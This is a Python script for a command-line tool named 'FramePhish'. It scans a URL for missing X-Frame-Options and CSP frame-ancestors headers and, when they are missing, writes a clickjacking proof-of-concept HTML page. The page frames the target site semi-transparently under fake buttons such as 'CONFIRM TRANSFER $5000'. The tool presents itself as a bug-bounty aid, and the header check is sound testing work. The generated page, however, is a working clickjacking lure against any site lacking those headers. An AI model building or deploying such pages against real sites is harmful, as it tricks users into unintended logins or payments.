import requests
import os
import urllib.parse
from datetime import datetime
from colorama import init, Fore, Style

# Initialize colorama (works on Windows too)
init(autoreset=True)

# Shortcuts for colors
C = Fore.CYAN + Style.BRIGHT
G = Fore.GREEN + Style.BRIGHT
R = Fore.RED + Style.BRIGHT
Y = Fore.YELLOW + Style.BRIGHT
W = Fore.WHITE + Style.BRIGHT
DIM = Style.DIM
RESET = Style.RESET_ALL


def is_vulnerable_to_clickjacking(url):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url

        response = requests.get(url, timeout=10, allow_redirects=True)
        headers = response.headers
        
        xfo = headers.get('X-Frame-Options', '').lower()
        csp = headers.get('Content-Security-Policy', '').lower()
        
        if 'deny' in xfo or 'sameorigin' in xfo:
            return False, f"{G}Protected by X-Frame-Options: {xfo or '(empty)'}{RESET}", headers
        if "frame-ancestors 'none'" in csp or "frame-ancestors 'self'" in csp:
            return False, f"{G}Protected by CSP frame-ancestors{RESET}", headers
        
        if not xfo and 'frame-ancestors' not in csp:
            return True, f"{R}No X-Frame-Options or CSP frame-ancestors → vulnerable{RESET}", headers
        
        return True, f"{Y}Weak/partial protection → test manually ({xfo} | {csp}){RESET}", headers
   
    except requests.RequestException as e:
        return False, f"{Y}Error connecting: {str(e)}{RESET}", {}


def generate_poc_html(target_url, output_file):
    parsed = urllib.parse.urlparse(target_url)
    clean_name = parsed.netloc.replace('.', '_') + '_' + parsed.path.strip('/').replace('/', '_')
    clean_name = clean_name or 'target'
    
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Clickjacking PoC - {target_url}</title>
    <style>
        body {{ margin:0; padding:0; overflow:hidden; background:#000; font-family:Arial,sans-serif; }}
        #container {{ position:relative; width:100vw; height:100vh; }}
        iframe {{ position:absolute; top:0; left:0; width:100%; height:100%; border:none; opacity:0.4; pointer-events:none; }}
        .overlay {{ position:absolute; top:0; left:0; width:100%; height:100%; z-index:10; }}
        .fake-btn {{
            position:absolute;
            background:rgba(255,0,0,0.7); color:white; font-size:28px; font-weight:bold;
            padding:20px 40px; border-radius:10px; cursor:pointer;
            text-align:center; box-shadow:0 0 20px rgba(255,255,255,0.5);
        }}
        #btn1 {{ top:35%; left:38%; }}
        #btn2 {{ top:55%; left:42%; width:300px; }}
    </style>
</head>
<body>
    <div id="container">
        <iframe src="{target_url}" id="target-frame"></iframe>
        <div class="overlay">
            <div class="fake-btn" id="btn1">CLICK HERE TO LOGIN</div>
            <div class="fake-btn" id="btn2">CONFIRM TRANSFER $5000</div>
        </div>
    </div>
    <div style="position:fixed; bottom:10px; left:10px; color:white; background:rgba(0,0,0,0.7); padding:10px; border-radius:5px;">
        Proof-of-Concept for Clickjacking on {target_url}<br>
        Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | For bug bounty report only
    </div>
    <script>
        window.onload = () => {{
            document.getElementById('target-frame').contentWindow.scrollTo(0, 300);
        }};
    </script>
</body>
</html>"""
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(html)
    return os.path.abspath(output_file)


def print_banner():
    print(r"""
███████╗██████╗  █████╗ ███╗   ███╗███████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝██╔══██╗██║  ██║██║██╔════╝██║ ██╔╝
█████╗  ██████╔╝███████║██╔████╔██║█████╗  ██████╔╝███████║██║███████╗█████╔╝
██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗██╔══██║██║╚════██║██╔═██╗
██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗██║  ██║██║  ██║██║███████║██║  ██╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
""".rstrip())

    print(f"{C}╔════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{C}║ {W}FramePhish – Clickjacking Scanner & Instant PoC Generator    {C}║{RESET}")
    print(f"{C}║ {DIM}v1.2 • Bug Bounty Friendly • Interactive Mode                {C}║{RESET}")
    print(f"{C}╚════════════════════════════════════════════════════════════════╝{RESET}")
    print()


def main():
    print_banner()
    
    print(f"{W}Usage:{RESET}")
    print(f"  Paste a target URL when prompted")
    print(f"  Press {DIM}Enter{RESET} without typing anything to quit")
    print()
    print(f"{W}Examples:{RESET}")
    print(f"  {DIM}https://example.com/login{RESET}")
    print(f"  {DIM}target.com/admin          {DIM}(auto-adds https://){RESET}")
    print(f"  {DIM}vuln-site.com/settings{RESET}")
    print()
    print(f"{C}Enter URL to scan (or just press Enter to exit){RESET}")
    
    while True:
        try:
            user_input = input(f"{W}URL → {RESET}").strip()
            
            if not user_input:
                print(f"\n{G}Thanks for using ClickMe. Happy hunting!{RESET}\n")
                break
            
            url = user_input
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            
            print(f"\n{Y}Scanning → {W}{url}{RESET}")
            
            vulnerable, reason, headers = is_vulnerable_to_clickjacking(url)
            
            if vulnerable:
                print(f"\n{R}┌──────────────────────────────────────────────┐{RESET}")
                print(f"{R}│               VULNERABLE                     │{RESET}")
                print(f"{R}└──────────────────────────────────────────────┘{RESET}")
                print(f" {reason}")
                
                filename_base = url.replace('https://', '').replace('http://', '').replace('/', '_').replace(':', '_').rstrip('_')
                filename = f"clickjack_poc_{filename_base}.html"
                
                poc_path = generate_poc_html(url, filename)
                print(f"{G}PoC    : {W}{poc_path}{RESET}")
                print(f"{G}Action : {DIM}Double-click the file or open in browser to see the demo{RESET}")
                print(f"{G}Tip    : {DIM}Take screenshot / short video for your report{RESET}")
            else:
                print(f"\n{G}┌──────────────────────────────────────────────┐{RESET}")
                print(f"{G}│             Protected / Not vulnerable       │{RESET}")
                print(f"{G}└──────────────────────────────────────────────┘{RESET}")
                print(f" {reason}")
            
            if headers:
                print(f"\n{DIM}Key headers:{RESET}")
                for h in ['X-Frame-Options', 'Content-Security-Policy']:
                    if h in headers:
                        print(f"  {DIM}{h}:{RESET} {headers[h]}")
            
            print()  # spacing
            
        except KeyboardInterrupt:
            print(f"\n\n{Y}Interrupted. Exiting...{RESET}\n")
            break
        except Exception as e:
            print(f"\n{R}Error: {str(e)}{RESET}\n")


if __name__ == "__main__":
    main()
